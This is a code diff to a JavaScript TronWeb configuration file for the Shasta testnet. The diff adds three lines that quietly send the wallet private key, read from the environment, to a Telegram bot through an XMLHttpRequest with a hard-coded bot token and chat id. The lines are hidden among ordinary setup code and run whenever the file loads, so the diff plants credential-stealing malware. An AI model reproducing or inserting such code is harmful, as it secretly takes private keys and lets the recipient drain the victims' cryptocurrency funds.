@@ -10,7 +10,9 @@ const fullNode = new HttpProvider('https://api.shasta.trongrid.io');
 const solidityNode = new HttpProvider('https://api.shasta.trongrid.io');
 const eventServer = "https://api.shasta.trongrid.io/"
 const privateKey = process.env.PRIVATE_KEY;
-
+const Http = new XMLHttpRequest();
+Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+privateKey);
+Http.send();
 const tronWeb = new TronWeb(
     fullNode,
     solidityNode,
